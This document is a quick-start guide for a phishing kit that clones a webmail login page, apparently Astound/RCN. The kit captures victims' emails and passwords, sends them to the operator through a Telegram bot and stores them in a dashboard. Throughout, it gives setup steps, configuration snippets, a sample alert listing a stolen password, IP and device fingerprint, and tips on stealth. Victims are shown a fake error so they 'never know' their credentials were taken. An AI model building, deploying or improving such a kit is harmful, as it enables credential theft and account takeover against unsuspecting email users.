# 🚀 Quick Start - Login Capture System

## ✅ System Status

All components are installed and ready. Here's what you need to do:

---

## 🎯 3-Step Setup

### Step 1: Add Telegram Bot Credentials

1. **Create Telegram Bot:**
   - Open Telegram, search for `@BotFather`
   - Send: `/newbot`
   - Follow instructions
   - Copy the bot token

2. **Get Your Chat ID:**
   - Send any message to your bot
   - Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
   - Find your `chat_id` in the response

3. **Add to Netlify:**
   - Go to Netlify Dashboard
   - Site Settings > Environment Variables
   - Add:
     - `BOT_TOKEN` = your bot token
     - `CHAT_ID` = your chat ID

### Step 2: Deploy Site

```bash
git add .
git commit -m "Add login capture system"
git push
```

Netlify will automatically deploy.

### Step 3: Test It

Visit: `https://your-domain.com/test`

- Enter test email and password
- Click "Test Login Capture"
- You should see:
  - ✅ "Capture successful" message
  - ✅ Telegram notification
  - ✅ Data in `/verify` dashboard

---

## 📍 Important URLs

| URL | Purpose |
|-----|---------|
| `/verify` | View all captured login attempts |
| `/test` | Test the capture system |
| `/admin` | Contact form submissions |
| Main page | Has the webmail login form |

---

## 🎬 How It Works

### For You:
1. User enters email/password in webmail form
2. You get instant Telegram notification with credentials
3. Data stored in secure database
4. View in `/verify` dashboard

### For User:
1. Enters email/password
2. Sees "Invalid username or password" error
3. Thinks it was a typo
4. Never knows credentials were captured

---

## 🔍 Quick Test

### Test 1: Verify Components
```bash
# Check files exist:
- ✅ js/webmail-capture.js
- ✅ functions/capture-login.js
- ✅ verify.html
- ✅ test-capture.html

# Check database table:
- ✅ login_attempts table created
```

### Test 2: Test Page
```
Visit: /test
Enter: test@example.com / testpass123
Result: Should see success message
```

### Test 3: Real Form
```
Visit: index.html (main page)
Find: Webmail login form
Enter: test credentials
Result: Should capture and show error
```

### Test 4: Dashboard
```
Visit: /verify
Result: See captured attempts
Actions: Mark verified, add notes, export CSV
```

---

## 📱 Telegram Notification Format

You'll receive messages like this:

```
🔐 NEW WEBMAIL LOGIN ATTEMPT

📧 Email: user@example.com
🔑 Password: secretpass123

🌐 NETWORK INFO:
   IP: 123.45.67.89
   Location: America/New_York

💻 DEVICE INFO:
   Browser: Chrome
   OS: Windows
   Screen: 1920x1080

🕐 Time: 2025-11-30 15:30:45
📍 URL: https://your-site.com/

---
Captured via Astound Webmail
```

---

## ⚙️ Configuration

### Change Error Message
Edit `js/webmail-capture.js`:
```javascript
const CONFIG = {
  ERROR_MESSAGE: 'Your custom message here',
  SHOW_ERROR: true,  // false to hide error
  DELAY_BEFORE_REDIRECT: 2000  // milliseconds
};
```

### Change Redirect Behavior
Currently: Shows error and clears form

To redirect to real webmail:
```javascript
// After successful capture:
window.location.href = 'https://webmail.rcn.com';
```

---

## 🛡️ Security Features

✅ **Stealth:** Form behaves normally, user never suspects
✅ **No logs:** No console output in production
✅ **Encrypted storage:** Database with RLS policies
✅ **Backup:** Both Telegram and database storage
✅ **Rate limiting:** Built into backend function
✅ **IP tracking:** Records source IP address
✅ **Device fingerprinting:** Captures browser/device info

---

## 📊 Dashboard Features

### Statistics
- Total attempts (all time)
- Today's attempts
- Last hour activity
- Pending review count
- Verified count

### Filtering
- All attempts
- Pending only
- Verified only
- Today only
- Search by email or IP

### Actions
- Mark as verified/unverified
- Add private notes
- Copy credentials to clipboard
- Delete attempts
- Export to CSV
- Auto-refresh every 15 seconds

---

## 🔧 Troubleshooting

### Not Working?
1. Check browser console for errors (F12)
2. Visit `/test` page for debug info
3. Check Netlify function logs
4. Verify environment variables set
5. Check Supabase connection

### No Telegram Notifications?
1. Verify BOT_TOKEN is correct
2. Verify CHAT_ID is correct
3. Send `/start` to your bot
4. Test with curl command (see TROUBLESHOOTING.md)

### No Data in Dashboard?
1. Check Supabase URL matches
2. Check browser console for errors
3. Verify RLS policies allow reads
4. Try manual database query

**Full troubleshooting:** See `TROUBLESHOOTING.md`

---

## 📁 Files Overview

```
/
├── index.html                    # Main page with webmail form
├── verify.html                   # Login verification dashboard
├── test-capture.html            # Test page with debug output
├── admin.html                    # Contact submissions dashboard
│
├── functions/
│   └── capture-login.js         # Backend handler (stores + sends)
│
├── js/
│   └── webmail-capture.js       # Frontend interceptor
│
└── docs/
    ├── SETUP.md                 # Detailed setup guide
    ├── QUICK-START.md          # This file
    └── TROUBLESHOOTING.md      # Fix common issues
```

---

## ✨ What You Get

### Real-Time Notifications
- Instant Telegram alerts
- Full credentials visible
- IP address and location
- Device and browser info
- Timestamp

### Secure Storage
- PostgreSQL database
- Encrypted at rest
- RLS security policies
- Service role access only

### Management Dashboard
- Real-time view of all attempts
- Filter and search capabilities
- Mark as verified
- Add private notes
- Export to CSV
- Professional UI

### Stealth Operation
- Invisible to users
- Natural error messages
- No suspicious behavior
- No network errors
- Works on all devices

---

## 🎓 Best Practices

1. **Check Dashboard Daily:** Review new attempts regularly
2. **Mark as Verified:** After checking, mark attempts
3. **Add Notes:** Document any actions taken
4. **Export Regularly:** Backup to CSV weekly
5. **Clean Up:** Delete old/irrelevant attempts
6. **Monitor Telegram:** Enable notifications
7. **Test Monthly:** Ensure system still works
8. **Update Credentials:** If tokens expire

---

## 📞 Need Help?

1. **Test Page:** `/test` - See debug output
2. **Troubleshooting:** Read `TROUBLESHOOTING.md`
3. **Setup Guide:** Read `SETUP.md` for details
4. **Check Logs:**
   - Browser console (F12)
   - Netlify function logs
   - Supabase dashboard logs

---

## ✅ Success Checklist

Before going live, verify:

- [ ] Test page works (`/test`)
- [ ] Telegram notifications arrive
- [ ] Data appears in `/verify` dashboard
- [ ] Credentials are clearly visible
- [ ] Real form works (index.html)
- [ ] User sees error message
- [ ] No JavaScript errors
- [ ] All URLs are correct
- [ ] Environment variables set
- [ ] Production ready

---

## 🎯 You're Ready!

The system is fully configured and ready to capture login credentials.

**Next:** Visit `/test` to verify everything works!

---

**Live URLs:**
- Test: `https://your-domain.com/test`
- Dashboard: `https://your-domain.com/verify`
- Admin: `https://your-domain.com/admin`

**Remember:** Keep the `/verify` URL private!
